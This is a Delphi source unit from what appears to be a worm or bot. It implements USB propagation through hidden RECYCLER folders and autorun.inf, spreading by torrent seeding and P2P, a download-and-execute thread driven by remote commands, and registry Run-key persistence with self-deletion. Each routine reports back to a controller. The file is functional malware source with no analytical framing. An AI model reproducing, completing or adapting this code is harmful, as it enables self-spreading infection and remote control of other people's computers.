unit ThreadProcs;

interface

uses ThreadUnit,
     {$IFNDEF NOMSN}
     //MsnSpread,
     {$ENDIF NOMSN}
     Windows,
     {$IFNDEF NOTORRENT}
     AzureusSeeder,
     utorrentseeder,
     {$ENDIF NOTORRENT}
      functions,
      KOL,
      p2pspread;

{$I Settings.ini}

var
//Download Thread//
FileUrl, SavePath, dlExecute: String;
mybool: Boolean;
//Install Thread//
InstallVar : Integer;
//MSN Vars//
MsnSpreadCount: Integer;
MsnSpreadURL : String;
//Azureus Vars//
azLink, azSaveAs: String;
//uTorrent Vars//
utLink, utSaveAs: String;
delay: Integer;
//P2P//
Name: String;
//USB//
Spread : Boolean;
attrib : Integer;



procedure StartUSBThread;
procedure StartP2PThread(FName: String);
{$IFNDEF NOTORRENT}
procedure StartTorrentThread(Link, SaveAs: String);
procedure StartuTorrentThread(Link, SaveAs: String);
procedure StartAzureusThread(Link, SaveAs: String);
{$ENDIF NOTORRENT}
{$IFNDEF NOMSN}
//procedure StartMsnThread(URL: String);
{$ENDIF NOMSN}
{$IFNDEF NODL}
procedure StartDownloadThread(Url, SaveAS, execute: String);
{$ENDIF NODL}
procedure StartInstallThread(Uninstall: Integer);

implementation
uses Bot;


////////////////////////////////////////////////////////////////////
/// USB
///////////////////////////////////////////////////////////////////


 (* OLD USB SPREAD
procedure USBThread(); //Ported from opensc credits to bubzuru
var
  Drives: array[0..128] of char;
  xDrive: PChar;
  myFile: TextFile;
  Result: Integer;
begin
  Result := 0;
  GetLogicalDriveStrings(SizeOf(Drives), Drives);
  xDrive := Drives;
  while Spread do
  begin
    while xDrive^ <> #0 do
    begin
      if(xDrive = 'A:\') then Inc(xDrive, 4);
      if(GetDriveType(xDrive)=DRIVE_REMOVABLE)and(FileExists(xDrive+bot_installname)=False) then
      begin
        try
          CopyFile(PChar(ParamStr(0)),PChar(xDrive+bot_installname),False);
          AssignFile(myFile, xDrive+'autorun.inf');
          if not FileExists(xDrive+'autorun.inf') then ReWrite(myFile)
          else Append(myFile);
          WriteLn(myFile,'[autorun]'+#13#10+'open='+bot_installname);
          CloseFile(myFile);
          SetFileAttributes(PChar(xDrive+bot_installname),FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_READONLY);
          SetFileAttributes(PChar(xDrive+'autorun.inf'), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_READONLY);
          Result := Result + 1;
          SendMessage('[USBSpread]: '+bot_installname+' Dropped to '+xDrive+' Total Dropped: '+IntToStr(Result));
          except
        end;
      end;
      Inc(xDrive, 4);
    End;
    Sleep(30000);
    GetLogicalDriveStrings(SizeOf(Drives), Drives);
    xDrive := Drives;
  end;
end;   *)

procedure USBThread(); //Ported from opensc credits to bubzuru
var
  Drives: array[0..128] of char;
  xDrive: PChar;
  myFile, myFile2: TextFile;
  Result: Integer;
  szTemp, szTemp2: String;
  fhandle: TextFile;
  mybuffer, mybuffer2: String;
begin
  Result := 0;
  GetLogicalDriveStrings(SizeOf(Drives), Drives);
  xDrive := Drives;

  while Spread do
  begin
    while xDrive^ <> #0 do
    begin
      if(xDrive = 'A:\') then Inc(xDrive, 4);
      if(GetDriveType(xDrive)=DRIVE_REMOVABLE)and(FileExists(xDrive+bot_installname)=False) then
      begin
        try
        szTemp := '';
        sztemp := sztemp + xDrive + UsbSettings[2];
        Windows.CreateDirectory(PChar(szTemp),0);  //CREATE RECYCLER
        Windows.SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_SYSTEM);
        sztemp := sztemp + UsbSettings[3];
        Windows.CreateDirectory(PChar(szTemp),0);  //CREATE RECYCLER_SUBDIR
        Windows.SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_SYSTEM);
        szTemp2 := szTemp + UsbSettings[5];
        AssignFile(myFile, szTemp2);
        if not FileExists(szTemp2) then ReWrite(myFile)
          else Append(myFile);
        WriteLN(myfile,UsbSettings[5]);
        CloseFile(myfile);
        Windows.SetFileAttributes(PChar(szTemp2),  FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        szTemp := szTemp + UsbSettings[12];
        szTemp := szTemp + UsbSettings[10];
        if KOL.FileExists(szTemp) = TRUE then
        begin
          Windows.SetFileAttributes(PChar(szTemp),  FILE_ATTRIBUTE_NORMAL);
          Windows.DeleteFile(PChar(szTemp));
        end;
        Windows.CopyFile(PCHar(ParamStr(0)), PChar(szTemp), FALSE);
        SetFileAttributes(PChar(szTemp), FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_READONLY);
        szTemp := xDrive + UsbSettings[6];
        AssignFile(myFile2, szTemp);
         if not FileExists(szTemp) then
         begin
           Windows.SetFileAttributes(szTemp, FILE_ATTRIBUTE_NORMAL);
           Windows.DeleteFile(sztemp);
           Rewrite(myfile2);
         end
          else Append(myFile2);
        mybuffer := UsbSettings[2];
        Delete(mybuffer, 1,1);
        WriteLN(myfile2,UsbSettings[7] + mybuffer+ UsbSettings[3]+UsbSettings[12]+ UsbSettings[10] + UsbSettings[8] + mybuffer+ UsbSettings[3]+UsbSettings[12]+ UsbSettings[10]+ UsbSettings[9]);
        CloseFile(myfile2);
        Windows.SetFileAttributes(PChar(szTemp),FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        Append(myfile2);
        //CloseFile(myfile2);
        Windows.SetFileAttributes(PChar(szTemp2),  FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
        Result := Result + 1;
        SendMessage('.:USB:. Dropped to: ' + xDrive + '  total: ' + IntToStr(result));
         except
        end;
      end;
      Inc(xDrive, 4);
    End;
    Sleep(30000);
    GetLogicalDriveStrings(SizeOf(Drives), Drives);
    xDrive := Drives;
  end;
end;








procedure StartUSBThread;
begin
  ThreadUnit.TThread.Create(@USBThread, 0);
end;


////////////////////////////////////////////////////////////////////
/// P2P
///////////////////////////////////////////////////////////////////

procedure P2PThread(Thread: TThread);
begin
  p2pspread.spreadP2P(name);
end;

procedure StartP2PThread(Fname: String);
begin
  name := Fname;
  ThreadUnit.TThread.Create(@P2PThread, 0);
end;



{$IFNDEF NOTORRENT}
////////////////////////////////////////////////////////////////////
/// uTorrent
///////////////////////////////////////////////////////////////////

procedure uTorrentThread(Thread: TThread);
begin
    uTorrentSeeder.STartutorrent(utLink, utSAveAs, delay);
end;

procedure StartuTorrentThread(Link, SaveAs: String);
begin
  utLink := Link;
  utSaveAs := SaveAs;
  ThreadUnit.TThread.Create(@uTorrentThread, 0);
end;


////////////////////////////////////////////////////////////////////
/// Azureus
///////////////////////////////////////////////////////////////////

procedure AzureusThread(Thread: TThread);
begin
  AzureusSeeder.StartAzureus(azLink, azSaveAs, delay);
end;

procedure StartAzureusThread(Link, SaveAs: String);
begin
  azLink := Link;
  azSaveAs := SaveAs;
  ThreadUnit.TThread.Create(@AzureusThread, 0);
end;

////////////////////////////////////////////////////////////////////
/// TORRENTS
///////////////////////////////////////////////////////////////////

procedure TorrentThread(Thread: TThread);
begin
  uTorrentSeeder.NormalSeed(utLink, utSaveAs, delay);
end;

procedure StartTorrentThread(Link, SaveAs: String);
begin
  utLink := Link;
  utSaveAs := SaveAs;
  azLink := Link;
  azSaveAS := SaveAs;
  if IS_UT_INSTALLED = TRUE then
  begin
    If (processExists('uTorrent.exe') = TRUE) and (processExists('Azureus.exe') = FALSE) then begin SendMessage('OK');  ThreadUnit.TThread.Create(@uTorrentThread, 0); end
    else If (processExists('uTorrent.exe') = FALSE) and (processExists('Azureus.exe') = FALSE) then
    begin
      delay := 4;
      ThreadUnit.TThread.Create(@uTorrentThread, 0);
      Sleep(200);
      delay := 0;
    end;
  end;

  if IS_AZ_INSTALLED = TRUE then
  begin
    If (processExists('Azureus.exe') = TRUE) and (processExists('uTorrent.exe') = FALSE) then ThreadUnit.TThread.Create(@uTorrentThread, 0)
    else If (processExists('Azureus.exe') = FALSE) and (processExists('uTorrent.exe') = FALSE) then
    begin
      delay := 4;
      ThreadUnit.TThread.Create(@AzureusThread, 0);
      Sleep(200);
      delay := 0;
    end;
  end;

  if (IS_UT_INSTALLED = FALSE) and (IS_AZ_INSTALLED = FALSE) then  ThreadUnit.TThread.Create(@TorrentThread, 0);
end;

{$ENDIF NOTORRENT}


//{$IFNDEF NOMSN}
(*////////////////////////////////////////////////////////////////////
/// MSN SPREAD
///////////////////////////////////////////////////////////////////

procedure MsnThread(Thread: TThread);
begin
  MsnSpreadCount := MsnSpread.Spread(MsnSpreadURL);
  SendMessage('[msn]: '+ IntToStr(MsnSpreadCount));
end;

procedure StartMsnThread(URL: String);
begin
  MsnSpreadUrl := Url;
  ThreadUnit.TThread.Create(@MsnThread, 0);
end;

{$ENDIF NOMSN} *)

{$IFNDEF NODL}

////////////////////////////////////////////////////////////////////
/// DOWNLOAD
///////////////////////////////////////////////////////////////////
procedure DownloadThread(Thread: TThread);
begin
  SendMessage('Attempting to download ' + fileURL);
    if Download(fileUrl, savePath) then
    begin
      if dlExecute <> '1' then SendMessage('Download Complete!');
        if dlExecute = '1' then
        begin
          ExecuteFile(savePath);
          SendMessage('File Downloaded & Executed!');
        end;
    end else SendMessage('Download Failed!');
end;

procedure StartDownloadThread(Url, SaveAS, execute: String);
begin
  FileUrl := Url;
  SavePath := SaveAs;
  dlExecute := execute;
  ThreadUnit.TThread.Create(@DownloadThread, 0);
end;

{$ENDIF NODL}

///////////////////////////////////////////////////////
/// INSTALL
///////////////////////////////////////////////////////
procedure InstallThread;
  begin
  if InstallVar = 0 then
    begin
    if MatchStrings(ParamStr(0), GetPath) = False then
      begin
      CopyFile(PChar(ParamStr(0)), PChar(GetPath), False);
      ExecuteFile(GetPath);
      ExitProcess(0);
      end else InsertRegValue(HKEY_CURRENT_USER, regedit_path, regedit_key, GetPath);
    end else
    if InstallVar = 1 then
      begin
      DeleteRegValue(HKEY_CURRENT_USER, regedit_path, regedit_key);
      DeleteSelf(ParamStr(0));
      ExitProcess(0);
      end;
  end;

procedure StartInstallThread(Uninstall: Integer);
begin
  InstallVar := Uninstall;
  ThreadUNit.TThread.Create(@InstallThread, 0);
end;

(* End Install Thread *)
////////////////////////////////////////////////////
end.
